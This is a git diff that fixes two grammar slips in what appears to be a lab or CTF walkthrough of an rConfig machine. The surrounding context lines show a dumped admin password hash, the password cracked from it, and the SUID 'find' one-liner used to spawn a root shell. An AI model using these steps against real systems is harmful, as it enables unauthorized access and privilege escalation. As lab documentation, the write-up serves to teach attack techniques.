@@ -41,7 +41,7 @@ rconfig
 [+] Extracting 10 first users :
 admin:1:dc40b85276a1f4d7cb35f154236aa1b2
 ```
-crack the hash and get got the password abgrtyu  
+crack the hash and we got the password abgrtyu  
 since we have credential we can login with this python script
 ```console
 $ searchsploit rConfig       
@@ -73,7 +73,7 @@ bash-4.2$ find / -perm -4000 -type f 2>/dev/null
 /usr/bin/find
 ```
 https://gtfobins.org/gtfobins/find/#shell  
-follow the command got we got the root shell
+follow the command and we got the root shell
 ```console
 bash-4.2$ find . -exec /bin/sh -p \; -quit 
 sh-4.2# id
